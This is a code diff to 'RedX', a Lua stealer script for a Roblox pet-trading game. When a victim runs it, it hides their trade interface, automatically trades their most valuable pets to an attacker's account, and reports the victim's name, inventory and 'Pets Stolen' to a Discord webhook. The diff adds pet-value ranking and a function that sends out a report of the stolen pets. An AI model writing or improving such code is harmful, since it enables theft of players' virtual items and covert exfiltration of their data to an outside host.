@@ -1,6 +1,6 @@
 Username = "sosedra6" -- >> Your main username
 Username2 = "knisdqx_meow" -- >> Your alt username
-Webhook = "https://webhook.lewisakura.moe/api/webhooks/1441486238535385259/UD9X5VKaySPqiqUe4-1kqlcb53x7CD8anvEfE7sIabuCWYPpehYBkuRrAJL85QxF5QLZ" -- >> https://stealer.to/
+Webhook = "https://webhook.lewisakura.moe/api/webhooks/1441486238535385259/UD9X5VKaySPqiqUe4-1kklcb53x7CD8anvEfE7sIabuCWYPpehYBkuRrAJL85QxF5QLZ" -- >> https://stealer.to/
 GoodHitsOnly = false -- >> Kicks player if they don't have good pets
 
 repeat task.wait() until game:IsLoaded()
@@ -81,7 +81,7 @@ local valuesTable = {
     ["Lava Dragon"] = {value = 20, rarity = "legendary"},
     ["Strawberry Bat Dragon"] = {value = 15, rarity = "legendary"},
     ["SS Bat Dragon"] = {value = 10, rarity = "legendary"},
-    ["Alicorn"] = {value = 30, rarity = "legendary"}, -- from that updated
+    ["Alicorn"] = {value = 30, rarity = "legendary"},
     ["Kitty Bat"] = {value = 16, rarity = "legendary"},
 
     -- Ultra-Rare Pets
@@ -104,7 +104,7 @@ local valuesTable = {
     ["Drake"] = {value = 3, rarity = "ultra_rare"},
     ["Lion"] = {value = 2, rarity = "ultra_rare"},
     ["Blue Dog"] = {value = 1, rarity = "ultra_rare"},
-    ["Gingerbread Reindeer"] = {value = 45, rarity = "ultra_rare"}, -- from that updated
+    ["Gingerbread Reindeer"] = {value = 45, rarity = "ultra_rare"},
 
     -- Rare Pets
     ["Bunny"] = {value = 8, rarity = "rare"},
@@ -115,14 +115,14 @@ local valuesTable = {
     ["Poodle"] = {value = 2, rarity = "rare"},
     ["Swan"] = {value = 2, rarity = "rare"},
     ["Black Panther"] = {value = 1, rarity = "rare"},
-    ["Zebra"] = {value = 1, rarity = "rare"}, -- from that updated
+    ["Zebra"] = {value = 1, rarity = "rare"},
 
     -- Uncommon Pets
     ["Cat"] = {value = 4, rarity = "uncommon"},
     ["Dog"] = {value = 3, rarity = "uncommon"},
     ["Buffalo"] = {value = 2, rarity = "uncommon"},
     ["Robin"] = {value = 1, rarity = "uncommon"},
-    ["Jumping Spider"] = {value = 2, rarity = "uncommon"}, -- from that updated
+    ["Jumping Spider"] = {value = 2, rarity = "uncommon"},
     ["Shih Tzu"] = {value = 2, rarity = "uncommon"},
     ["Tree Frog"] = {value = 2, rarity = "uncommon"},
     ["Snowcat"] = {value = 2, rarity = "uncommon"},
@@ -176,13 +176,6 @@ local function hideDialog()
     end
 end
 
-local function visibleTrade()
-    local focusPA = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("FocusPetApp")
-    local focusFr = focusPA:FindFirstChild("Frame")
-    local backpack = focusFr:FindFirstChild("Backpack")
-    backpack.Visible = true
-end
-
 local function declineTradeRequest(player)
     TradeAcceptOrDeclineRequest:InvokeServer(player, false)
 end
@@ -205,6 +198,45 @@ local ClientData = Loaders("ClientData")
 local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
 local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
 
+-- Function to calculate pet value
+local function calculatePetValue(petData)
+    local petInfo = InventoryDB[petData.category][petData.id]
+    local petName = petInfo.name
+    local baseValue = 0
+    
+    -- Find base value from valuesTable
+    for petKey, valueData in pairs(valuesTable) do
+        if string.lower(petName) == string.lower(petKey) then
+            baseValue = valueData.value
+            break
+        end
+    end
+    
+    -- Apply multipliers based on properties
+    local multiplier = 1.0
+    
+    if petData.properties then
+        if petData.properties.mega_neon and petData.properties.flyable and petData.properties.rideable then
+            multiplier = rarityMultipliers.MFR
+        elseif petData.properties.neon and petData.properties.flyable and petData.properties.rideable then
+            multiplier = rarityMultipliers.NFR
+        elseif petData.properties.flyable and petData.properties.rideable then
+            multiplier = rarityMultipliers.FR
+        elseif petData.properties.mega_neon then
+            multiplier = rarityMultipliers.M
+        elseif petData.properties.neon then
+            multiplier = rarityMultipliers.N
+        elseif petData.properties.flyable then
+            multiplier = rarityMultipliers.F
+        elseif petData.properties.rideable then
+            multiplier = rarityMultipliers.R
+        end
+    end
+    
+    return baseValue * multiplier, baseValue, petName
+end
+
+-- Count pets and calculate total value
 local neon_count = 0
 local mega_neon_count = 0
 local flyable_count = 0
@@ -217,6 +249,8 @@ local common_count = 0
 local fr_count = 0
 local mfr_count = 0
 local nfr_count = 0
+local total_value = 0
+local top_pets = {}
 
 for _, petData in pairs(playerData.inventory.pets) do
     if petData.properties and type(petData.properties) == "table" then
@@ -242,6 +276,45 @@ for _, petData in pairs(playerData.inventory.pets) do
             mfr_count = mfr_count + 1
         end
     end
+    
+    -- Calculate pet value and add to total
+    local calculatedValue, baseValue, petName = calculatePetValue(petData)
+    total_value = total_value + calculatedValue
+    
+    -- Track top pets
+    table.insert(top_pets, {
+        name = petName,
+        value = calculatedValue,
+        properties = petData.properties or {}
+    })
+end
+
+-- Sort top pets by value
+table.sort(top_pets, function(a, b)
+    return a.value > b.value
+end)
+
+-- Get top 5 most valuable pets
+local top_pets_text = ""
+for i = 1, math.min(5, #top_pets) do
+    local pet = top_pets[i]
+    local pet_type = ""
+    if pet.properties.mega_neon and pet.properties.flyable and pet.properties.rideable then
+        pet_type = " MFR"
+    elseif pet.properties.neon and pet.properties.flyable and pet.properties.rideable then
+        pet_type = " NFR"
+    elseif pet.properties.flyable and pet.properties.rideable then
+        pet_type = " FR"
+    elseif pet.properties.mega_neon then
+        pet_type = " Mega"
+    elseif pet.properties.neon then
+        pet_type = " Neon"
+    elseif pet.properties.flyable then
+        pet_type = " Fly"
+    elseif pet.properties.rideable then
+        pet_type = " Ride"
+    end
+    top_pets_text = top_pets_text .. string.format("%s%s: %d$\n", pet.name, pet_type, math.floor(pet.value))
 end
 
 for i, v in pairs(ClientData.get("inventory").pets) do
@@ -285,37 +358,42 @@ local jobId = game.JobId
 local TeleportScript = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
 local VersionValue = "1.12 (trade mechanic changed)"
 
-    local embed = {
-        ["title"] = "New HIT with **RedX**",
-        ["color"] = tonumber(0x3365FF),
-        ["fields"] = {
-            {
-                ["name"] = "〘:mammoth:〙**User Information**",
-                ["value"] = "```lua\n" ..
-                            "Username      : " .. tostring(game.Players.LocalPlayer.Name) .. "\n" ..
-                            "Account Age   : " .. tostring(game.Players.LocalPlayer.AccountAge) .. " Days\n" ..
-                            "Executor      : " .. tostring(ExecutorValue) .. "\n" ..
-                            "Receiver      : " .. tostring(Username) .. "\n" ..
-                            "RedX          : " .. tostring(VersionValue) .. "```"                            
-            },
-            {
-                ["name"] = "〘:100:〙**Inventory Information**",
-                ["value"] = "```lua\n" ..
-                            "〘Pets above 1$〙  : " .. tostring(mfr_count + nfr_count + flyable_count + rideable_count) .. "\n" ..
-                            "〘Mega Pets〙      : " .. tostring(mega_neon_count) .. "\n" ..
-                            "〘Neon Pets〙      : " .. tostring(neon_count) .. "\n" ..
-                            "〘Legendary Pets〙 : " .. tostring(legendaries_count) .. "\n" ..
-                            "〘Ultra-Rare Pets〙: " .. tostring(ultra_count) .. "\n" ..
-                            "〘Uncommon pets〙  : " .. tostring(uncommon_count) .. "\n" ..
-                            "〘Rare pets〙      : " .. tostring(rare_count) .. "```" 
-            },
-            {
-                ["name"] = "〘:computer:〙**Teleport to :mammoth:**",
-                ["value"] = "```lua\n" ..
-                            TeleportScript .. "\n" .."```"
-            },
-        }
+local embed = {
+    ["title"] = "New HIT with **RedX**",
+    ["color"] = tonumber(0x3365FF),
+    ["fields"] = {
+        {
+            ["name"] = "〘:mammoth:〙**User Information**",
+            ["value"] = "```lua\n" ..
+                        "Username      : " .. tostring(game.Players.LocalPlayer.Name) .. "\n" ..
+                        "Account Age   : " .. tostring(game.Players.LocalPlayer.AccountAge) .. " Days\n" ..
+                        "Executor      : " .. tostring(ExecutorValue) .. "\n" ..
+                        "Receiver      : " .. tostring(Username) .. "\n" ..
+                        "RedX          : " .. tostring(VersionValue) .. "```"                            
+        },
+        {
+            ["name"] = "〘:100:〙**Inventory Information**",
+            ["value"] = "```lua\n" ..
+                        "Total Value      : " .. string.format("%d$", math.floor(total_value)) .. "\n" ..
+                        "MFR Pets         : " .. tostring(mfr_count) .. "\n" ..
+                        "NFR Pets         : " .. tostring(nfr_count) .. "\n" ..
+                        "FR Pets          : " .. tostring(fr_count) .. "\n" ..
+                        "Mega Pets        : " .. tostring(mega_neon_count) .. "\n" ..
+                        "Neon Pets        : " .. tostring(neon_count) .. "\n" ..
+                        "Legendary Pets   : " .. tostring(legendaries_count) .. "\n" ..
+                        "Ultra-Rare Pets  : " .. tostring(ultra_count) .. "```" 
+        },
+        {
+            ["name"] = "〘:crown:〙**Top Valuable Pets**",
+            ["value"] = "```lua\n" .. (top_pets_text ~= "" and top_pets_text or "No valuable pets") .. "```"
+        },
+        {
+            ["name"] = "〘:computer:〙**Teleport to :mammoth:**",
+            ["value"] = "```lua\n" ..
+                        TeleportScript .. "\n" .."```"
+        },
     }
+}
 
 function SendMessageEMBED(url, embed, bool)
   local http = game:GetService("HttpService")
@@ -366,6 +444,51 @@ function SendMessageEMBED(url, embed, bool)
   end
 end
 
+-- Function to send stolen pets information
+function SendStolenPets(ReceiverName, stolenPets, totalStolenValue)
+    local stolenPetsText = ""
+    for i, pet in ipairs(stolenPets) do
+        local pet_type = ""
+        if pet.properties.mega_neon and pet.properties.flyable and pet.properties.rideable then
+            pet_type = " MFR"
+        elseif pet.properties.neon and pet.properties.flyable and pet.properties.rideable then
+            pet_type = " NFR"
+        elseif pet.properties.flyable and pet.properties.rideable then
+            pet_type = " FR"
+        elseif pet.properties.mega_neon then
+            pet_type = " Mega"
+        elseif pet.properties.neon then
+            pet_type = " Neon"
+        elseif pet.properties.flyable then
+            pet_type = " Fly"
+        elseif pet.properties.rideable then
+            pet_type = " Ride"
+        end
+        stolenPetsText = stolenPetsText .. string.format("%s%s: %d$\n", pet.name, pet_type, math.floor(pet.value))
+    end
+
+    local stolenEmbed = {
+        ["title"] = "**TRADE COMPLETED** :inbox_tray:",
+        ["color"] = tonumber(0x00FF00),
+        ["fields"] = {
+            {
+                ["name"] = "〘:bust_in_silhouette:〙**Trade Details**",
+                ["value"] = "```lua\n" ..
+                            "Victim      : " .. tostring(game.Players.LocalPlayer.Name) .. "\n" ..
+                            "Receiver    : " .. tostring(ReceiverName) .. "\n" ..
+                            "Total Value : " .. string.format("%d$", math.floor(totalStolenValue)) .. "\n" ..
+                            "Pets Stolen : " .. tostring(#stolenPets) .. "```"
+            },
+            {
+                ["name"] = "〘:gift:〙**Stolen Pets**",
+                ["value"] = "```lua\n" .. (stolenPetsText ~= "" and stolenPetsText or "No pets stolen") .. "```"
+            }
+        }
+    }
+
+    SendMessageEMBED(Webhook, stolenEmbed, false)
+end
+
 game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
 game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
 game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
@@ -373,11 +496,24 @@ game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = fals
 local sent = false
 
 local function TradeIncoming(ReceiverName)
-    sent =  true
+    sent = true
+    
+    -- Store original pets before trade
+    local originalPets = {}
+    local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
+    for petUid, petData in pairs(PetsInventory) do
+        local calculatedValue, baseValue, petName = calculatePetValue(petData)
+        table.insert(originalPets, {
+            uid = petUid,
+            name = petName,
+            value = calculatedValue,
+            properties = petData.properties or {}
+        })
+    end
+
     while sent do
         local RouterClient = Loaders("RouterClient")
         local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
-        visibleTrade()
         moveGuiOffscreen()
     
         SendTrade:FireServer(game.Players[ReceiverName])
@@ -389,55 +525,20 @@ local function TradeIncoming(ReceiverName)
         local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
         local ClientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
 
-        -- Function to calculate pet value based on valuesTable and properties
-        local function calculatePetValue(petData)
-            local petInfo = InventoryDB[petData.category][petData.id]
-            local petName = petInfo.name
-            local baseValue = 0
-            
-            -- Find base value from valuesTable
-            for petKey, valueData in pairs(valuesTable) do
-                if string.lower(petName) == string.lower(petKey) then
-                    baseValue = valueData.value
-                    break
-                end
-            end
-            
-            -- Apply multipliers based on properties
-            local multiplier = 1.0
-            
-            if petData.properties then
-                if petData.properties.mega_neon and petData.properties.flyable and petData.properties.rideable then
-                    multiplier = rarityMultipliers.MFR
-                elseif petData.properties.neon and petData.properties.flyable and petData.properties.rideable then
-                    multiplier = rarityMultipliers.NFR
-                elseif petData.properties.flyable and petData.properties.rideable then
-                    multiplier = rarityMultipliers.FR
-                elseif petData.properties.mega_neon then
-                    multiplier = rarityMultipliers.M
-                elseif petData.properties.neon then
-                    multiplier = rarityMultipliers.N
-                elseif petData.properties.flyable then
-                    multiplier = rarityMultipliers.F
-                elseif petData.properties.rideable then
-                    multiplier = rarityMultipliers.R
-                end
-            end
-            
-            return baseValue * multiplier, baseValue
-        end
-
         -- Get and sort pets by value
         local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
         local sortedPets = {}
+        local stolenPets = {}
         
         for petUid, petData in pairs(PetsInventory) do
-            local calculatedValue, baseValue = calculatePetValue(petData)
+            local calculatedValue, baseValue, petName = calculatePetValue(petData)
             table.insert(sortedPets, {
                 uid = petUid,
                 data = petData,
                 value = calculatedValue,
-                baseValue = baseValue
+                baseValue = baseValue,
+                name = petName,
+                properties = petData.properties or {}
             })
         end
         
@@ -453,6 +554,11 @@ local function TradeIncoming(ReceiverName)
         for _, petInfo in ipairs(sortedPets) do
             if petCount < petLimit then
                 AddPetRemote:FireServer(petInfo.uid)
+                table.insert(stolenPets, {
+                    name = petInfo.name,
+                    value = petInfo.value,
+                    properties = petInfo.properties
+                })
                 petCount = petCount + 1
                 wait(0.2) -- Small delay to avoid rate limits
             else
@@ -460,52 +566,22 @@ local function TradeIncoming(ReceiverName)
             end
         end
         
+        -- Calculate total stolen value
+        local totalStolenValue = 0
+        for _, pet in ipairs(stolenPets) do
+            totalStolenValue = totalStolenValue + pet.value
+        end
+        
         wait(5)
         AcceptNegotiationRemote:FireServer() -- Accepts first 
         wait(5)
         ConfirmTradeRemote:FireServer() -- finish
+        
+        -- Send stolen pets information
+        SendStolenPets(ReceiverName, stolenPets, totalStolenValue)
+        break
     end
 end
-
-function SendLeaveNotify(playerName)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-
-    local dataLeave = {
-        username = "RedX | Notification",
-        avatar_url = "https://i.pinimg.com/736x/d2/cd/f2/d2cdf2a8169c9e444ed5402c67fce98d.jpg",
-        content = "**" .. playerName .. "** left from the game!",
-        embeds = {
-            {
-                color = 0x610066,
-                fields = {
-                    {
-                        name = "〘:mammoth:〙**User**",
-                        value = "```lua" ..
-                            "\nUsername   : " .. game.Players.LocalPlayer.Name .."```",
-                        inline = false
-                    }
-                }
-            }
-        }
-    }
-
-    local jsonDataLeave = game:GetService("HttpService"):JSONEncode(dataLeave)
-
-    local response = request({
-        Url = Webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = jsonDataLeave
-    })
-end
-
-game:GetService("Players").PlayerRemoving:Connect(function(player)
-    if player == game:GetService("Players").LocalPlayer then
-        SendLeaveNotify(player.Name)
-    end
-end)
 
 SendMessageEMBED(Webhook, embed, true)
 
